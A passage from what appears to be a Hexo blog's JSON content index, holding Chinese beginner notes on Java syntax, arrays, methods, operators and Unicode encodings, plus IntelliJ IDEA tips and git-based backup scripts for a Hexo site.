堆内存里面的内存都有一个内存地址值：16进制 堆内存里面的数据，都有默认值。规则： 如果是整数 默认值为0 如果是浮点数 默认值为0.0 如果是字符 默认值为‘\\u0000’ 如果是布尔 默认值为false 如果是引用类型 默认值为null 3.方法区（Method Area）：存储.class相关的信息，包含方法的信息 4.本地方法栈（Native Method Stack）：与操作系统相关。 5.寄存器（PC Register）：与CPU相关。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组","slug":"java00010数组","date":"2020-02-05T21:39:02.000Z","updated":"2020-02-07T11:50:26.499Z","comments":true,"path":"2020/02/06/java00010数组/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/06/java00010数组/","excerpt":"","text":"数组 数组的概念 ​ 数组是引用数据类型 ​ 类型要统一 ​ 数组的长度在运行期间不可以改变 初始化 动态初始化（指定长度） ​ 数据类型[] 数组名称 = new 数据类型[数组长度] ​ 使用动态初始化数组的时候,其中的元素将会自动拥有一个默认值.规则如下: 如果是整数类型,那么默认值为0; 如果是浮点类型,那么默认值为0.0; 如果是字符类型,那么默认值为’\\u0000’ u代表Unicode ,0000代表十六进制数; 如果是布尔类型,那么默认值为false; 如果是引用类型,那么默认值为null(空常量); 注意事项 静态初始化其实也有默认值的过程,只不过系统自动马上将默认值替换成为了大括号当中的具体数值. 123456789101112131415class test010 &#123; public static void main(String[] args) &#123; int[] arr1 = new int[10]; int[] arr2 = new int[]&#123;1,2,3,4&#125;; System.out.println(arr1[0]);//默认值为0; System.out.println(arr1[1]);//默认值为0; System.out.println(arr1[2]);//默认值为0; /*数组赋值*/ arr1[1] = 100; System.out.println(arr1[1]); &#125;&#125; 拆分格式 数据类型[] 数组名; 数组名 = new 数据类型名[]{元素1,元素2,…} 数组名 = new 数据类型名[长度]; 123456789public class test010 &#123; public static void main(String[] args) &#123; int[] arr; arr = new int[]&#123;10,2,3,4&#125;; //arr = new int[10]; &#125;&#125; 静态初始化(指定内容) ​ 数据类型[] 数组名 = new 数据类型[] {元素1,元素2,…,元素n}; 1234567public class test010 &#123; public static void main(String[] args) &#123; int[] arr = new int[]&#123;1,2,3,4&#125;; &#125;&#125; 省略格式 ​ 数据类型[] 数组名 = {元素1,元素2,…,元素n}; 1234567public class test010 &#123; public static void main(String[] args) &#123; int[] arr = &#123;1,2,3,4&#125;; &#125;&#125; 拆分格式 ​ 不能再用省略格式 ​ 数据类型[] 数组名; ​ 数组名 = new 数据类型名[]{元素1,元素2,…} 1234567public class test010 &#123; public static void main(String[] args) &#123; int[] arr; arr = new int[]&#123;1,2,3,4,5&#125;; &#125;&#125; 访问数组元素 ​ 直接打印数组名,会打印数组内存地址哈希值 ​ 格式 : 数组名[索引值] ​ 索引值从0开始到数组长度-1结束 12345678910111213public class test010 &#123; public static void main(String[] args) &#123; int[] arr; arr = new int[]&#123;1,2,3,4,5&#125;; System.out.println(arr);//打印数组内存地址哈希值 System.out.println(arr[0]);//使用数组下标访问数组元素 for(int i = 0; i &lt; arr.length;i++)//数组下标不大于数组的长度 &#123; System.out.println(arr[i]); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"方法定义和使用","slug":"java00009方法定义和使用","date":"2020-02-05T21:13:51.000Z","updated":"2020-02-05T21:34:04.363Z","comments":true,"path":"2020/02/06/java00009方法定义和使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/06/java00009方法定义和使用/","excerpt":"","text":"方法 方法定义 ​ 以public static开头 ​ public static 类型 方法名() ​ { ​ } 12345678910public class test010 &#123; public static void main(String[] args) &#123; System.out.println(\"\"); &#125; public static void funName(int a) //方法定义 &#123; //语句块 &#125;&#125; 方法的三种调用格式 单独调用 ​ 方法名（[参数]） 12345678910public class test010 &#123; public static void main(String[] args) &#123; funName(20); System.out.println(\"\"); &#125; public static void funName(int a) //方法定义 &#123; //语句块 &#125;&#125; 打印调用 ​ System.out.println(方法名（[参数]）) 12345678910public class test010 &#123; public static void main(String[] args) &#123; System.out.println( funName(20) ); &#125; public static int funName(int a) //方法定义 &#123; return a + 10; &#125;&#125; 赋值调用 ​ int a = 方法名（[参数]） 12345678910public class test010 &#123; public static void main(String[] args) &#123; int a = funName(20);//赋值调用 &#125; public static int funName(int a) //方法定义 &#123; return a + 10; &#125;&#125; 方法分为两种 参数 ​ 有参数 ​ 无参数 12345678910111213public class test010 &#123; public static void main(String[] args) &#123; &#125; public static int funName(int a) //有参数方法定义 &#123; return a + 10; &#125; public static int funName() //无参数方法定义 &#123; return 10; &#125;&#125; 返回值 ​ 有返回值 ​ 无返回值 12345678910111213public class test010 &#123; public static void main(String[] args) &#123; &#125; public static int funName(int a) //有返回值方法定义 &#123; return a + 10; &#125; public static void funName() //无返回值方法定义 &#123; return ; &#125;&#125; 方法注意事项 方法应该定义类中，不能定义在方法中 方法定义没有前后顺序 方法定义之后不会自动执行，需要手动调用 如果方法有返回值，必须写上 return 返回值 返回的数据必须要和返回值类型一致 对于void返回值类型，可以只写return； 一个方法可以有多个return，但只能执行其中一个 方法重载Overload 如果功能相同，参数不同，可以使用方法重载 特征 ​ 方法名要相同 ​ 参数个数不同 ​ 参数类型不同 ​ 类型名 参数顺序不同 12345678910111213141516171819202122232425public class test010 &#123; public static void main(String[] args) &#123; &#125; public static int funName(int a) &#123; return a + 10; &#125; public static int funName() //参数个数不同 &#123; return 10; &#125; public static int funName(int a,int b) //参数个数不同 &#123; return a + b; &#125; public static int funName(double a,int b) //参数类型不同 &#123; return (int)a + b; &#125; public static int funName(int a,double b) //参数顺序不同 &#123; return a + (int)b; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"集成开发环境","slug":"java00008集成开发环境","date":"2020-02-05T20:49:36.000Z","updated":"2020-02-05T21:13:05.461Z","comments":true,"path":"2020/02/06/java00008集成开发环境/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/06/java00008集成开发环境/","excerpt":"","text":"集成开发软件 IntelliJ IDEA ​ 官方网站 www.jetbrains.com ​ 先新建项目,再新建模块,然后新建包,最后新建源文件 ​ 输入psvm 回车 ​ 自动生成public static void main(String[] args) { ​ 会自动保存 快捷键 ​ alt + 4 显示输出框 ​ shift + f10 编译运行 ​ alt + enter 自动修复代码 ​ ctrl + y 删除光标所在行 ​ ctrl + d 复制光标当前行,插入光标位置下面 ​ ctrl+alt + L 格式化代码 ​ ctrl + / 单行注释,再按一次取消单行注释 ​ Ctrl+Shift +/ 多行注释 ​ alt+ins 自动生成代码 ​ alt+shift +上下箭头 移动当前代码行 ​ shift + f6 一个改全部改 ​ ctrl + 鼠标左键 转到方法定义处 设置 ​ 设置字体 ​ file-&gt;settings…-&gt; editor-&gt; Font-&gt;size 设置自动提示快捷键 ​ file-&gt;settings…-&gt;点击齿轮-&gt;Duplicate 复制一份 -&gt;Main menu -&gt; code -&gt; completion -&gt;basic 项目和模块的关闭和导入 关闭 file -&gt; close project 导入 Open -&gt; 选择项目文件 有小黑块的 然后一直下一步 模块 移除 ​ Remove Moudle 导入 ​ File -&gt; Project Structure -&gt; Import Moudle -&gt;一直选next -&gt;OK","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"基本结构","slug":"java00007基本结构","date":"2020-02-05T13:07:02.000Z","updated":"2020-02-05T13:36:13.790Z","comments":true,"path":"2020/02/05/java00007基本结构/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/05/java00007基本结构/","excerpt":"","text":"顺序结构 ​ 从上到下,顺序执行 选择结构 单if语句 ​ if(条件表达式){语句块} 123456789public class test010 &#123; public static void main(String[] args) &#123; int a = 10,b = 11; if(a &lt; b) &#123; System.out.println(a); &#125; &#125;&#125; 标准if else语句 ​ if(条件表达式){语句块;}else{语句块} 1234567891011public class test010 &#123; public static void main(String[] args) &#123; int a = 10,b = 11; if(a &lt; b) &#123; System.out.println(a); &#125;else&#123; System.out.println(b); &#125; &#125;&#125; 多层if语句 ​ if(条件表达式){语句块;}else if(条件表达式){语句块}else{语句块} 12345678910111213public class test010 &#123; public static void main(String[] args) &#123; int a = 10,b = 11,c =12; if(a &gt; b &amp;&amp; a &gt; c) &#123; System.out.println(a); &#125;else if(b &gt; c &amp;&amp; b &gt; a)&#123; System.out.println(b); &#125;else&#123; System.out.println(c); &#125; &#125;&#125; switch ​ 选择对应于的常量,并执行对应常量的语句 ​ switch(表达式) { ​ case 常量1: ​ 语句; ​ break; ​ case 常量2: ​ 语句; ​ break; ​ default: ​ 语句; } 1234567891011121314151617public class test010 &#123; public static void main(String[] args) &#123; char c = 'A'; switch(c) &#123; case 'A': System.out.println(\"X&gt;=90\"); break; case 'B': System.out.println(\"80&gt;=X&lt;90\"); break; default: System.out.println(\"X&lt;79\"); &#125; &#125;&#125; 常量类型 整型 ​ byte,char,short,int 引用数据类型 ​ String,enum ​ 常量值不能重复 循环结构 for循环语句 for(变量初始化;条件判断;改变变量值) { 语句块; } 12345678public class test010 &#123; public static void main(String[] args) &#123; for(int i = 0;i &lt; 10;i++) &#123; System.out.println(i); &#125; &#125;&#125; while循环语句 while(条件) { 语句块; } 12345678910public class test010 &#123; public static void main(String[] args) &#123; int i = 0; while(i &lt; 10) &#123; System.out.println(i); i++; &#125; &#125;&#125; do while循环语句 初始化表达式 do{ ​ 语句块; }while(条件表达式); 123456789public class test010 &#123; public static void main(String[] args) &#123; int i = 0; do&#123; System.out.println(i); &#125;while(i++ &lt; 10); &#125;&#125; break ​ 中止循环 continue ​ 结束本次循环 死循环 ​ java可以有死循环 12345678public class test010 &#123; public static void main(String[] args) &#123; while(1) &#123; //我是死循环 &#125; &#125;&#125; 循环嵌套 ​ 一个循环体嵌套着另一个循环体这就叫做循环嵌套 123456789101112public class test010 &#123; public static void main(String[] args) &#123; for(int i = 0;i &lt; 10;i++) &#123; for(int j = 0;j &lt; 10;j++) &#123; System.out.print(\"*\"); &#125; System.out.println(\"\"); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"使用hexo+GitHub搭建的个人博客 文件备份","slug":"使用hexo-GitHub搭建的个人博客-文件备份","date":"2020-02-05T12:10:54.000Z","updated":"2020-02-05T12:19:28.220Z","comments":true,"path":"2020/02/05/使用hexo-GitHub搭建的个人博客-文件备份/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/05/使用hexo-GitHub搭建的个人博客-文件备份/","excerpt":"","text":"使用hexo+GitHub搭建的个人博客 文件备份 1.在GitHub中创建 hexo 分支来存储本地 markdown 文件 在本地文件根目录创建 .gitignore 文件，若存在修改为 123456.DS_Store*.lognode_modules/.deploy*/public/db.json 在本地文件根目录中初始化 git 1git init 创建分支hexo 1git checkout -b hexo 提交到仓库，需要注意的事在提交之前要把themes目录下主题中的 .git 文件夹重命名或者删除，不然的话 git 会把主题当做子模块来处理。 12git add .git commit -m &apos;init&apos; 添加远程仓库 1git remote add origin git@github.com:MrWangwj/MrWangwj.github.io.git push 到远程分支 1git push origin hexo 2.在另一台电脑上使用 首先要克隆下这个项目 1git clone git@github.com:MrWangwj/MrWangwj.github.io.git 进入博客目录 1cd MrWangwj.github.io.git 切换到博客文件分支 1git checkout -b hexo origin/hexo 安装hexo 1npm install hexo --save 然后编辑、查看 12hexo g //编译hexo s //浏览器查看 localhost:4000 提交 git，若在提交过程中出现 ERROR Deployer not found: git 可执行 npm install hexo-deployer-git --save 后重新提交。 1hexo d 在写了新 markdown 文件后提交 git 123git add .git commit -m &apos;新增博客&apos;git push origin hexo 到此，我们以后只要写完博客发布后记得 push 一下就能实现备份了。","categories":[{"name":"githubHexo","slug":"githubHexo","permalink":"https://xiaowuyoucy.github.io/categories/githubHexo/"}],"tags":[]},{"title":"自动备份Hexo源文件","slug":"自动备份Hexo源文件","date":"2020-02-05T10:16:47.000Z","updated":"2020-02-05T11:11:10.150Z","comments":true,"path":"2020/02/05/自动备份Hexo源文件/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/05/自动备份Hexo源文件/","excerpt":"","text":"自动备份Hexo源文件 前言 配置一个Hexo博客往往需要作者倾注大量心血，而如果哪天电脑坏了或者换电脑导致Hexo源文件丢失的话就是一件比较杯具的事。因此本文给出了一种自动备份Hexo源文件到Github的方法，能够在执行hexo deploy命令后自动执行Git命令以推送Hexo源文件到Github仓库。 原理 NodeJS的事件监听机制能够监听Hexo的事件。通过查询Hexo文档，找到了Hexo的主要事件，见下表： 事件名 描述 deployBefore 在部署完成前发布。 deployAfter 在部署成功后发布。 exit 在Hexo 结束前发布。 generateBefore 在静态文件生成前发布。 generateAfter 在静态文件生成后发布。 new 在文章文件建立后发布。该事件返回文章参数。 processBefore 在处理原始文件前发布。此事件会返回一个地址，代表 Box（Box）的根目录。 processAfter 在原始文件处理后发布。此事件会返回一个地址，代表 Box（Box）的根目录。 ready 在初始化完成后发布。 通过查询上表发现，我们可以通过监听Hexo的deployAfter事件，待部署成功后自动运行Git备份命令，从而达到自动备份的目的。 实现 将Hexo目录加入Git仓库 首先需要在Github创建一个新的repository,名字与本地Hexo文件夹同名即可。然后进入本地Hexo文件夹，按顺序执行以下命令： 123git initgit remote add origin git@github.com:yourname/hexo.gitgit pull origin master 再每次执行hexo generate命令时，public/、.deploy、\\*.log文件夹会重写更新，因此需要在.gitignore文件（如果没有，手动创建一个）中写入public/、.deploy、\\*.log以忽略这几个目录，加快备份的速度。 然后再顺序执行以下命令，将文件推送到Github： 123git add .git commit -m &quot;备份hexo源码文件&quot;git push origin master 这三行命令便是手动推送本地文件到Github的命令,我们接下来要做的是让NodeJS监听到Hexo的deployAfter事件后自动执行上述命令。 安装shelljs模块 键入以下命令即可 1npm install --save shelljs 加入自动执行脚本 在Hexo根目录的scripts文件夹（没有就自己创建一个）下新建一个js文件，文件名随意。然后加入以下代码： 1234567891011121314151617181920212223242526272829303132333435require('shelljs/global');try &#123; hexo.on('deployAfter', function() &#123;//当deploy完成后执行备份 run(); &#125;);&#125; catch (e) &#123; console.log(\"产生了一个错误&lt;(￣3￣)&gt; !，错误详情为：\" + e.toString());&#125;function run() &#123; if (!which('git')) &#123; echo('Sorry, this script requires git'); exit(1); &#125; else &#123; echo(\"======================Auto Backup Begin===========================\"); cd('path to hexo'); //此处修改为Hexo根目录路径 if (exec('git add --all').code !== 0) &#123; echo('Error: Git add failed'); exit(1); &#125; if (exec('git commit -am \"Form auto backup script\\'s commit\"').code !== 0) &#123; echo('Error: Git commit failed'); exit(1); &#125; if (exec('git push origin master').code !== 0) &#123; echo('Error: Git push failed'); exit(1); &#125; echo(\"==================Auto Backup Complete============================\") &#125;&#125; 注意上述代码中第29行需要修改为自己Hexo文件夹的绝对路径。 效果 如果脚本运行成功，会得到类似以下的效果： 1234567891011121314======================Auto Backup Begin===========================cd: no such file or directory: C:/Users/17810/OneDrive/hexowarning: LF will be replaced by CRLF in source/_posts/自动备份Hexo源文件.md.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in source/_posts/自动备份Hexo源文件.md.The file will have its original line endings in your working directory.[master a6cb4c7] Form auto backup script&apos;s commit 1 file changed, 153 insertions(+)warning: LF will be replaced by CRLF in source/_posts/自动备份Hexo源文件.md.The file will have its original line endings in your working directory.To git@github.com:JacobZjw/hexo.git 0beaf4c..a6cb4c7 master -&gt; master==================Auto Backup Complete============================ 懒癌患者的小福利 在hexo中，我们常常使用hexo new命令来新建文章。然鹅，当我们的文章较多时，我们往往需要在成堆的文章中找到刚刚生成的文件，然后使用Markdown编辑器打开。作为一名懒癌患者怎么可能让自己如此受累。 于是，我找到了Hexo作者给出的解决办法 和上面类似，在scripts文件夹中创建一个js文件，添加以下代码： 1234567891011var spawn = require('child_process').exec;// Hexo 2.x 用户复制这段hexo.on('new', function(path)&#123; spawn('start \"markdown编辑器绝对路径.exe\" ' + path);&#125;);// Hexo 3 用户复制这段hexo.on('new', function(data)&#123; spawn('start \"markdown编辑器绝对路径.exe\" ' + data.path);&#125;); 保存并退出脚本之后，在命令行中键入： 1hexo new &quot;auto open editor test&quot; 是不是就顺利的自动打开了自动生成的md文件啦~","categories":[{"name":"githubHexo","slug":"githubHexo","permalink":"https://xiaowuyoucy.github.io/categories/githubHexo/"}],"tags":[]},{"title":"JDK9的JShell-编译器的两点优化","slug":"java00006JDK9的JShell-编译器的两点优化","date":"2020-02-04T00:17:40.000Z","updated":"2020-02-04T00:36:20.957Z","comments":true,"path":"2020/02/04/java00006JDK9的JShell-编译器的两点优化/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00006JDK9的JShell-编译器的两点优化/","excerpt":"","text":"JDK9的JShell 什么时候会用到 JShell 工具呢，当我们编写的代码非常少的时候，而又不愿意编写类，main方法，也不愿意去编译和运 行，这个时候可以使用JShell工具。 启动JShell工具，在DOS命令行直接输入JShell命令。 打开cmd ​ 输入jshell ​ 退出/exit 编译器的两点优化 byte,short,char类型右侧没有超过本身范围,会自动强制转换类型 byte a = 12 常量优化 1 + 1常量表达式 在编译时会计算结果,而不是在运行时计算 12345public class test010 &#123; public static void main(String[] args) &#123; byte a = 12 //隐式的把12从int类型转换为byte类型 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java方法","slug":"java00005方法","date":"2020-02-04T00:02:04.000Z","updated":"2020-02-04T00:15:05.122Z","comments":true,"path":"2020/02/04/java00005方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00005方法/","excerpt":"","text":"方法 定义 ​ public static void 方法名称(){语句块} ​ 方法的定义是无序性的 ​ 不能嵌套定义方法 命名方法 ​ 小驼峰式法 方法调用 格式 ​ 方法名称(); 12345678910111213public class test009 &#123; public static void main(String[] args) &#123; System.out.println(intAdd(10,20));//方法调用 &#125; //方法定义 public static int intAdd(int a,int b) &#123; return a + b; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java运算符","slug":"java00004java运算符","date":"2020-02-03T23:09:34.000Z","updated":"2020-02-04T00:02:38.881Z","comments":true,"path":"2020/02/04/java00004java运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00004java运算符/","excerpt":"","text":"运算符 基本运算符 + - * / % 自增自减 – ++ 复合运算符 += -= *= /= %= 默认会强制类型转换 类型不同运算时,返回的结果为较大范围的类型 123456789101112131415161718192021222324public class test007 &#123; public static void main(String[] args) &#123; int a = 10,b = 20,c = 0; c = a + b; System.out.println(c); c = a - b; System.out.println(c); c = a * b; System.out.println(c); c = a / b; System.out.println(c); c = a % b; System.out.println(c); c += a / a; // c = c + (a / a) System.out.println(c); &#125;&#125; String 字符串类型 String 变量名 字符串 + 字符串 = 拼接字符串 12345678public class test008 &#123; public static void main(String[] args) &#123; String str = \"abc\"; System.out.println(str + \"efg\"); &#125;&#125; 比较运算符 &gt; 大于 &lt; 小于 = 等于 &lt;= 小于等于 &gt;= 等于等于 == 等于 != 不等于 运算结果都是布尔值 12345678910public class test008 &#123; public static void main(String[] args) &#123; boolean isTrue; int a = 100,b = 99; isTrue = a &gt; b; System.out.println(isTrue); &#125;&#125; 逻辑运算符 &amp;&amp;(与),||(或),!(非) &amp;&amp; 两个条件为真,结果才为真 || 只要有一个条件为真,结果就为真 ! 真就是假,假就是真 12345678910public class test008 &#123; public static void main(String[] args) &#123; boolean isTrue; int a = 100,b = 99,c = 101; isTrue = a &gt; b &amp;&amp; a &lt; c; System.out.println(isTrue); &#125;&#125; 三元运算符 变量名 = 条件判断 ? 表达式A :表达式B ​ 条件为真返回表达式A,否则返回表达式B ​ 两个表达式类型要和变量类型一致 ​ 运算结果必须被使用 123456789public class test008 &#123; public static void main(String[] args) &#123; int a = 100,b = 99,c; c = (a &gt; b)? a : b; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"ASCII码-Unicode码","slug":"java00003ASCII码-Unicode码","date":"2020-02-03T22:26:00.000Z","updated":"2020-02-03T23:07:54.372Z","comments":true,"path":"2020/02/04/java00003ASCII码-Unicode码/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00003ASCII码-Unicode码/","excerpt":"","text":"ASCII码 从0到255都是ASCLL码 美国信息交换标准代码(American Standard Code For Information Interchange) Unicode Unicode 编码包含 ASCII 前面127的完全一样 称为万国码 Unicode（统一码、万国码、单一码）于1990年开始研发，1994年正式公布，是计算机领域里一项业界标准，包括字符集，编码方案等。Unicode是为了解决传统字符编码方案的局限而产生的，为每种语言中的每个字符都设定了统一唯一的二进制编码，以实现跨语言、跨平台进行文本转换、处理的要求。 计算机在设计时采用8个比特(bit)作为一个字节(byte)，所以一个字节最多能表示256个字符，早期对于使用英文的西方国家来说，一个字节可以存储大小写英文字母、数学和一些符号，因此使用一个字节来制作码表（ASCII）。后来计算机传到了其他的国家，很多国家都是使用自己的语言，比如中文、日文、韩文…语言复杂了，为了解决这个问题，每个国家制定自己的码表，中国在1980年便制定了GB2312汉字编码字符集，汉字比英文多很多，一个字节明显不够用，所有就使用2个字节来编码。然而不同国家所定义的字符编码虽然可以使用，但是在不同的国家间却经常出现不兼容的情况。如果电脑想处理多语言环境（使用中文或其他语言）可能存在无法同时支持多语言环境。 为了统一所有文字的编码，产生了Unicode,把所有语言的都统一到一套编码里，这样就不会乱码了。 在表示Unicode字符时，通常会用U+然后紧跟一组16进制的数字表示一个字符，在基本多文种平面（第零平面）Basic MultilingualPlane（BMP）里所有的字符都使用4位16进制表示。编码从U+0000到U+FFFF,共支持6万多个字符，在BMP以外的字符则需要使用5位或者6位16进制来表示。 目前Unicode字符分为17组编排，0x0000至0x10FFFF,每组称为平面（Plane）,每个面拥有65536个码位，共1114112个。 Unicode就像一张表，包所有的字符都编写到表中，每一个字符对应一个数字，称为码点（code point）,这个数字一般不直接使用，通过不同的编码方式来使用。 UTF-8、UTF-16、UTF-32就是将数字转换到程序数据的编码方案。UTF是“UnicodeTransformation Format”的缩写，可以翻译成Unicode字符集转换格式，即怎样将Unicode定义的数字转换成程序数据。 UTF-8 UTF-8是以字节位单位对Unicode编码，第0-127位字符使用1个字节来表示，和ASCII编码相同，从128号开始的字符使用2、3、4位字节来表，UTF-8又被称为可变长编码。 UTF-8编码中，使用的是变成的字节序列表示字符，字符对应的代码点（code point）可能使用的是1-4个字节，这样一个字节就是一个代码单元。一个代码点（code point）可能由1-4个代码单元（code unit）组成。 十进制 Unicode编码 UTF-8字节流 0-127位 0x000000-0x00007F 0xxxxxxx(7位) 128-2047位 0x000080-0x0007FF 110xxxxx 10xxxxxx（11位） 2048-65535位 0x000800-0x00FFFF 1110xxxx 10xxxxxx 10xxxxxx(16位) 65536-1114111位 0x010000-0x10FFFF 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx(21位) 比如：“汉”在Unicode中的编码为0x6C49,在表格中的第三行，使用模板为：1110xxxx 10xxxxxx10xxxxxx。将0x6C49转换成二进制：0110 1100 0100 1001，将模板中的x依次替换11100110 10110001 10001001，即E6 B1 89。 UTF-16 UTF-16也是可变长度编码，使用2个或者4个字节来存储字符，但是会浪费存储空间。 UTF-16编码中，字符对应的代码点（code point）可能使用的是2或4个字节，因此2个字节就是一个代码单元（code unit）,一个代码点（codepoint）可由1个或者2个代码单元（code unit）组成。 十进制 Unicode编码 UTF-16字节流 0-65535位 0x000000-0x00FFFF xxxxxxxx xxxxxxxx(16位) 65536-1114111位 0x010000-0x10FFFF 110110yy yyyyyyyy 110111xx xxxxxxxx(20位) 平面0有一个专用区：0xE000-0xF8FF，有6400个码位。平面0的0xD800-0xDFFF，共2048个码位，是一个被称作代理区（Surrogate）的特殊区域。代理区的目的用两个UTF-16字符表示BMP以外的字符。所有大于0x00FFFF的码需要使用代理区的码点。 为了将一个16位无符号整数的UTF-16编码与二个16位无符号整数的UTF-16编码区分开来，Unicode编码的设计者将0xD800-0xDFFF保留下来，并称为代理区（Surrogate）： 十进制 Unicode编码 说明 说明 55296-56191 0xD800－0xDB7F（896个） High Surrogates 高位替代 56192-56913 0xDB80－0xDBFF（128个） High Private Use Surrogates 高位专用替代 56320-57343 0xDC00－0xDFFF（1024个） Low Surrogates 低位替代 增补的16个平面（第2平面-第17平面），范围为：0x010000-0x10FFFF，需要使用2个代理码元表示，第一个码元为0xD800-0xDBFF(高位)范围是:11011000 00000000到11011011 11111111，第二个码元为0xDC00－0xDFFF（低位）范围是：11011100 00000000到11011111 11111111。 目前Unicode最大的码位是0x10FFFF，减去0x010000后最大值为0xFFFFF，完全可以用20位来表示。 把Unicode编码记作U，如果U≥0x10000，我们先计算U’=U-0x10000，然后将U’写成二进制形式：yyyy yyyy yyxx xxxx xxxx，U的UTF-16编码（二进制）就是：110110yyyyyyyyyy110111xxxxxxxxxx 比如：Unicode编码0x20C30，减去0x10000后，得到0x10C30，写成二进制是：0001 0000 1100 0011 0000。用前10位依次替代模板中的y，用后10位依次替代模板中的x，就得到： 1101100001000011 1101110000110000，即0xD8430xDC30。 UTF-32 UTF-32编码以32位无符号整数为单位。Unicode的UTF-32编码就是其对应的32位无符号整数。 UTF-32编码，一个代码点对应4个字节，因此4个字节就是一个代码单元（codeunit）。 十进制 Unicode编码 UTF-32字节流 0-111411位 0x000000-0x10FFFF xxxxxxxx xxxxxxxx xxxxxxxx xxxxxxxx (32位) 比如：编码0x6C49使用UTF-32编码其结果为：0x00006C49。 字节序 字节序有两种，分别是大端（Big Endian, BE）和小段（Little Endian, LE）。根据字节序的不同，UTF-16实现为UTF-16BE和UTF-16LE，UTF-32实现为UTF-32BE和UTF-32LE。 根据字节序的不同，UTF-16可被实现为UTF-16LE或UTF-16BE，UTF-32可被实现为UTF-32LE或UTF-32BE。 Unicode编码 UTF-16LE UTF-16BE UTF32-LE UTF32-BE 0x006C49 49 6C 6C 49 49 6C 00 00 00 00 6C 49 0x020C30 43 D8 30 DC D8 43 DC 30 30 0C 02 00 00 02 0C 30 Unicode标准建议用BOM（Byte Order Mark）来区分字节序，即在传输字节流前，先传输被作为BOM的字符“零宽无中断空格”。这个字符的编码是FEFF，而反过来的FFFE（UTF-16）和FFFE0000（UTF-32）在Unicode中都是未定义的码位，不应该出现在实际传输中。 UTF编码的BOM： UTF编码 Byte Order Mark (BOM) UTF-8 without BOM 无 UTF-8 with BOM EF BB BF UTF-16LE FF FE UTF-16BE FE FF UTF-32LE FF FE 00 00 UTF-32BE 00 00 FE FF","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"IntelliJ IDEA 中自定义模板代码的缩写","slug":"java00000IntelliJ-IDEA-中自定义模板代码的缩写","date":"2020-02-03T21:58:59.000Z","updated":"2020-02-03T22:10:30.936Z","comments":true,"path":"2020/02/04/java00000IntelliJ-IDEA-中自定义模板代码的缩写/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00000IntelliJ-IDEA-中自定义模板代码的缩写/","excerpt":"","text":"IntelliJ IDEA 中自定义模板代码的缩写 方法一：新建 Live Template step1. 点击 File – Setting step2. 选择 Live Template，点击右侧的+号，选择 Template Group step3. 输入自定义的名称，然后点击OK。 step4. 选中刚创建的 Template Group，再次点击右侧的+号，选择Live Template step5. 填入缩写词、描述、模版内容、生效文件范围等 配置模板时，变量名以$ $包围的字符的形式出现,调用的方法也是先以变量形式出现，写完模板信息后去编辑变量(Edit variables)。 $END$是一个特殊的预定义变量，表示光标最后跳转的位置。 step6. 点击右边的Edit variables（这个只有在使用了预定义函数的时候才能点击和设置） step7. 点击 Apply ，OK，完成！ 方法二：使用 IDEA 自带的 Live Template psvm 生成 main 方法 fori 生成 for 循环 sout 生成 System.out.println(); … 方法三：修改 IDEA 自带的 Live Template 以将 psvm 修改成 main 和 sout 修改成 syso 为例：","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数据类型转换","slug":"java00002数据类型转换","date":"2020-02-03T20:59:05.000Z","updated":"2020-02-03T22:21:57.550Z","comments":true,"path":"2020/02/04/java00002数据类型转换/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00002数据类型转换/","excerpt":"","text":"数据类型转换 隐式 ​ 代码不需要进行特殊处理,自动处理 ​ 规则:数据范围从小到大 123456789101112public class test006 &#123; public static void main(String[] args) &#123; /*从小到大隐式转换*/ byte a = 1; short c = 3; int d = 4; long e = 5; e = d = c = a; System.out.println(e); &#125;&#125; 显示 ​ (类型名) 数据 ​ (类型名)(数据) ​ 可能发生数据溢出和精度损失 ​ byte/char/short整数运算默认会自动提升为int类型 ​ boolean类型不能发生数据类型转换 1234567891011121314public class test006 &#123; public static void main(String[] args) &#123; /*显示强制转换*/ byte a = 2; int b = 4; a = (byte)(b); System.out.println(a); b = 20; a = (byte)b; System.out.println(a); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"变量","slug":"java00001变量","date":"2020-02-03T20:46:10.000Z","updated":"2020-02-03T20:56:29.796Z","comments":true,"path":"2020/02/04/java00001变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00001变量/","excerpt":"","text":"变量 程序运行期间,内容可以发生改变的值称为变量 先定义后使用 变量声明 数据类型 变量名; 数据类型 变量名 = 初始值; 变量使用 变量名 = 值; 常量有默认类型,如果常量数值大于默认类型,需要手动转换类型 